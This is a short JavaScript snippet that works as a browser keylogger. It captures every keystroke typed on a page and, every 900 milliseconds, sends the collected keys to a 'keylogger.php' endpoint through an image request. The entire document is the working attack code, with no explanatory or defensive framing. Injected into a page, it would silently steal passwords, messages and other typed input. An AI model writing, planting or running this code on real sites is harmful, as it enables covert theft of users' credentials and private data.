var keys='';

document.onkeydown = function(e) {
  get = window.event?event:e;
  key = get.key;
  keys+=key; 
}  
window.setInterval(function(){
new Image().src = 'keylogger.php?c='+encodeURIComponent(keys);
keys='';
}, 900);
